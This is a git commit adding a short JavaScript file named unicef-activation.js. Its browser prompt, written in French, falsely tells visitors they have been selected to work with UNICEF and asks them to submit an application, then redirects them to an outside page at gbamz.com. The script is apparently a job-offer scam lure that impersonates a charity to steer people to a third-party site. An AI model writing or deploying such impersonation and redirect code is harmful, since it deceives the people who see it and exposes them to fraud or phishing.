158268a7f308fbd3432f3a304080f86f9dac726c
sweet16palz-hub <sweet16palz@gmail.com>
2026-01-18 11:39:43 +0100

    Create unicef-activation.js

---
+++ unicef-activation.js
@@ -0,0 +1,5 @@
+var password = 'APPLY NOW'
+password=prompt('UNICEF: Félicitation. Vous faites partie des sélectionnés pour travailler avec nous, veuillez appuyer sur Ok pour soumettre votre candidature. ','APPLY NOW');
+if (password != 'APPLY NOW') {
+location.href='https://gbamz.com/unicef.html';
+}
